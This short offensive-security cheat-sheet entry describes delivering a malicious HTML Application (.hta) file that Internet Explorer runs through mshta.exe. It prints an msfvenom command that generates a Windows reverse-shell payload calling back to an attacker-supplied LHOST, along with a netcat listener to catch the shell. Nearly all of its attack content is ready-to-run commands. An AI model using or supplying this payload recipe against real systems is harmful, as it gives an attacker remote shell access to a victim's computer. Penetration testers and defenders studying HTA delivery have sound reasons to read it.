
## HTML File Upload

If a file is created with the extension of _**.hta**_ instead of _**.html**_, Internet Explorer will automatically interpret it as an HTML Application and offer the ability to execute it using the mshta.exe program. This attack only works for Internet Explorer.

```
# Crafting a payload and listener
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f hta-psh -o evil.hta
nc -lnvp 4444
```